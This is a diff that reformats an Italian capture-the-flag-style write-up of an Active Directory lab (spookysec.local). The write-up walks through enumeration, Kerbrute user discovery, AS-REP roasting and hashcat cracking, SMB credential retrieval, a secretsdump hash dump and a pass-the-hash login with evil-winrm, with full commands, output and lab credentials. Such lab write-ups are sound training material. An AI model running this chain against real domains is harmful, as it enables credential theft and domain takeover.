@@ -9,34 +9,32 @@ Windows
 
 # Prerequisiti / tools
 
-Impacket
+## Impacket
 
 [https://github.com/SecureAuthCorp/impacket](https://www.google.com/url?q=https://github.com/SecureAuthCorp/impacket&sa=D&source=editors&ust=1731856544152452&usg=AOvVaw2SWLa5EmWkoyWVbSLFLt3l)
 
-git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
+`git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket`
+`pip3 install -r /opt/impacket/requirements.txt`
+`cd /opt/impacket/ && python3 ./setup.py install`
 
-pip3 install -r /opt/impacket/requirements.txt
+## Bloodhound e Neo4j
 
-cd /opt/impacket/ && python3 ./setup.py install
+`apt install bloodhound neo4j`
 
-Bloodhound e Neo4j
-
-apt install bloodhound neo4j
-
-Enum4linux
+## Enum4linux
 
 
-Kerbrute
+## Kerbrute
 
 
 [https://github.com/ropnop/kerbrute/releases](https://www.google.com/url?q=https://github.com/ropnop/kerbrute/releases&sa=D&source=editors&ust=1731856544153419&usg=AOvVaw3c1DvAZmHm4qmSehyMnilF)
 
 Si scarica e poi si esegue con ./
 
-SMBclient e SMBget
+## SMBclient e SMBget
 
 
-Evil-WinRM
+## Evil-WinRM
 
 
 [https://github.com/Hackplayers/evil-winrm](https://www.google.com/url?q=https://github.com/Hackplayers/evil-winrm&sa=D&source=editors&ust=1731856544153906&usg=AOvVaw34DUjEAaFE7oFdRFAuOY40)
@@ -45,9 +43,9 @@ Istruzioni di installazione nel link
 
 # Enumeration
 
-NMAP
-====
+## NMAP
 
+```bash
 sudo nmap -sC -sV 10.10.243.171 -oN attacktive
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-21 14:50 CET  
@@ -78,10 +76,11 @@ Host script results:
   
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
 Nmap done: 1 IP address (1 host up) scanned in 136.61 seconds
+```
 
-Enum4Linux
+## Enum4Linux
 
-
+```bash
 enum4linux -a 10.10.243.171                                                                                                                       
 
 1 ⨯  
@@ -193,14 +192,15 @@ Use of uninitialized value $global\_workgroup in concatenation (.) or string at 
   
   
 enum4linux complete on Sun Nov 21 15:03:10 2021
+```
 
-Kerbrute
-
+## Kerbrute
 
 Per poterlo utilizzare si deve modificare il file /etc/hosts
 
 ![](images/image1.png)
 
+```bash
 /home/kali/Documents/./kerbrute\_linux\_amd64 userenum userlist.txt -d spookysec.local --dc spookysec.local  
   
   \_\_             \_\_               \_\_        
@@ -226,6 +226,7 @@ Version: v1.0.3 (9dad6e1) - 11/21/21 - Ronnie Flathers @ropnop
 2021/11/21 17:05:19 >  \[+\] VALID USERNAME:       JAMES@spookysec.local  
 2021/11/21 17:05:23 >  \[+\] VALID USERNAME:       Robin@spookysec.local  
 2021/11/21 17:05:47 >  \[+\] VALID USERNAME:       Administrator@spookysec.local
+```
 
 # Exploitation
 
@@ -233,9 +234,10 @@ Ho preso gli utenti significativi ottenuti dallo step precedente e li ho messi n
 
 Per vedere se possono ottenere un ticket di autenticazione senza password
 
-Impacket GetNPUsers.py
-======================
+## Impacket
+GetNPUsers.py
 
+```bash
 python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -no-pass -usersfile users.txt                                                        2 ⨯  
 Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation  
   
@@ -253,12 +255,13 @@ a858da15925713412a92d97035237685c3465afa0d75b289605d583908878c4c8c6cddba9af165cb
 \[-\] User JAMES@spookysec.local doesn't have UF\_DONT\_REQUIRE\_PREAUTH set  
 \[-\] User Robin@spookysec.local doesn't have UF\_DONT\_REQUIRE\_PREAUTH set  
 \[-\] User Administrator@spookysec.local doesn't have UF\_DONT\_REQUIRE\_PREAUTH set  
+```
 
-Hashcat
-
+## Hashcat
 
 Cercare negli esempi la tipologia di hash da qui [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://www.google.com/url?q=https://hashcat.net/wiki/doku.php?id%3Dexample_hashes&sa=D&source=editors&ust=1731856544158998&usg=AOvVaw0_ZYeKmcsV9ICVzunL3BYm)
 
+```bash
 hashcat -m 18200 hash.txt /home/kali/Documents/Attacktive/passwordlist.txt --show  
 $krb5asrep$23$svc\-admin@spookysec.local@SPOOKYSEC.LOCAL:e45af415c0823250b3183d60bee59c73$e18a9194bb65770f4a6595a91aa1cd34d8d3e46b85a14a26b2c0d13b91289815efa858da15925713412a92d97035237685c3465afa0d75b289605d583908878c4c8c6cddba9af165cb618c4ac6cda92bb059ab17f36f0311335bfc980eb8a23dc3e3ca7116adb81676fd0e1d44321  
 10781c434ab7658b60ff3803fe7c536dec2b46ac113802d5da48ae9856967e7316f67670a1ef73e84fb714cafe6e03d3fcc2727ef9606b9cede0beec7cbc9dfceb1e04ffe0ba72737f23eeed1fd  
@@ -269,14 +272,16 @@ $krb5asrep$23$svc\-admin@spookysec.local@SPOOKYSEC.LOCAL:e45af415c0823250b3183d6
 a858da15925713412a92d97035237685c3465afa0d75b289605d583908878c4c8c6cddba9af165cb618c4ac6cda92bb059ab17f36f0311335bfc980eb8a23dc3e3ca7116adb81676fd0e1d44321  
 10781c434ab7658b60ff3803fe7c536dec2b46ac113802d5da48ae9856967e7316f67670a1ef73e84fb714cafe6e03d3fcc2727ef9606b9cede0beec7cbc9dfceb1e04ffe0ba72737f23eeed1fd  
 86ab2af795b56ccb1a9964cd63d01d7f4524ed76dc844f264036a29b064b5a3136d4906f87d204edec8c70d3073a59ccf0ae9a5fd410:management2005
+```
 
 La password dell’utente svc-admin è management2005
 
-SMB enum con password
+## SMB enum con password
 
 
 Con le credenziali ottenute in precedenza vediamo quali share sono disponibili
 
+```bash
 smbclient -L \\\\spookysec.local -U svc-admin  
 Enter WORKGROUP\\svc-admin's password:    
   
@@ -289,14 +294,17 @@ Enter WORKGROUP\\svc-admin's password:  
       NETLOGON        Disk      Logon server share    
       SYSVOL          Disk      Logon server share    
 SMB1 disabled -- no workgroup available
+```
 
 Scarichiamo il contenuto della share backup
 
+```bash
 smbget -R smb://spookysec.local/backup -U svc-admin                                                                                                1 ⨯  
 Password for \[svc-admin\] connecting to //backup/spookysec.local:    
 Using workgroup WORKGROUP, user svc-admin  
 smb://spookysec.local/backup/backup\_credentials.txt                                                                                                          
 Downloaded 48b in 5 seconds
+```
 
 Poi facciamo un decode Base64
 
@@ -308,9 +316,9 @@ backup@spookysec.local:backup2517860
 
 # Privilege escalation
 
-Impacket secretsdump.py
+## Impacket secretsdump.py
 
-
+```bash
 └─$ python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@spookysec.local  
 Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation  
   
@@ -388,14 +396,16 @@ ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:7e75d84abe2053b7a8bf8a72f56706ddb965614
 ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:d8044e8096f3a187ffaa922c1ba75feb  
 ATTACKTIVEDIREC$:des-cbc-md5:5d1fea9e106d971c  
 \[\*\] Cleaning up...
+```
 
 Otteniamo che l’NTLM hash di Administrator è 0e0363213e37b94221497260b0bcb4fc
 
-Evil-WinRM
+## Evil-WinRM
 
 
 Per fare la login con il metodo pass the hash
 
+```bash
 evil-winrm -i 10.10.243.171 -u administrator -H 0e0363213e37b94221497260b0bcb4fc          
   
 Evil-WinRM shell v3.3  
@@ -415,5 +425,5 @@ Data: For more information, check Evil-WinRM Github: https://github.com/Hackplay
 Mode                LastWriteTime         Length Name  
 \----                -------------         ------ ----  
 \-a----         4/4/2020  11:39 AM             32 root.txt
-
+```
 Adesso è possibile ottenere i flag
